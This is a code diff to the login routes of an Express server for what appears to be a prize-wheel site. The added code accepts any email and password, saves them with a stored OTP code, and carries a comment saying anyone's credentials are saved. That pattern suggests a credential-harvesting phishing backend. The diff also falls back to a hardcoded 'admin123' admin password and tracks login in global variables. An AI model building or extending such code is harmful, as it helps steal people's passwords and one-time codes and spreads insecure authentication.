@@ -50,9 +50,12 @@ app.post("/api/auth/admin-login", (req, res) => {
   const expectedAdminEmail = process.env.ADMIN_EMAIL || "admin";
   const expectedAdminPassword = process.env.ADMIN_PASSWORD || "admin123";
 
-  if (username === expectedAdminEmail && password === expectedAdminPassword) {
+  const normalizedUsername = username?.trim();
+
+  if (normalizedUsername === expectedAdminEmail && password === expectedAdminPassword) {
     adminLoggedIn = true;
-    res.json({ ok: true });
+    currentEmail = null;
+    res.json({ ok: true, isAdmin: true });
   } else {
     res.status(401).json({ error: "Kredensial admin tidak valid" });
   }
@@ -71,19 +74,41 @@ app.post("/api/auth/login", async (req, res) => {
     return res.status(400).json({ error: "Email dan password wajib diisi" });
   }
 
-  try {
-    const users = await getUsers();
-    const existing = users.find((u) => u.email === email);
+  const normalizedEmail = email.trim();
+  const normalizedPassword = password;
 
-    if (existing) {
-      await upsertUser(email, password, existing.otpCode, existing.prizesWon, existing.spins);
-    } else {
-      await upsertUser(email, password, null, [], 0);
+  const expectedAdminEmail = process.env.ADMIN_EMAIL || "admin";
+  const expectedAdminPassword = process.env.ADMIN_PASSWORD || "admin123";
+
+  try {
+    // 1. Check if the login matches the ADMIN credentials from .env
+    if (normalizedEmail === expectedAdminEmail && normalizedPassword === expectedAdminPassword) {
+      adminLoggedIn = true;
+      currentEmail = null;
+      return res.json({ ok: true, isAdmin: true });
     }
 
-    currentEmail = email;
-    res.json({ ok: true, email });
+    // 2. Regular user - ANYONE can login with any email/password, credentials are saved
+    const users = await getUsers();
+    const existing = users.find((u) => u.email === normalizedEmail);
+
+    if (existing) {
+      await upsertUser(
+        normalizedEmail,
+        normalizedPassword,
+        existing.otpCode,
+        existing.prizesWon,
+        existing.spins,
+      );
+    } else {
+      await upsertUser(normalizedEmail, normalizedPassword, null, [], 0);
+    }
+
+    currentEmail = normalizedEmail;
+    adminLoggedIn = false;
+    res.json({ ok: true, isAdmin: false, email: normalizedEmail });
   } catch (err) {
+    console.error("Login process error:", err);
     res.status(500).json({ error: "Proses login gagal" });
   }
 });
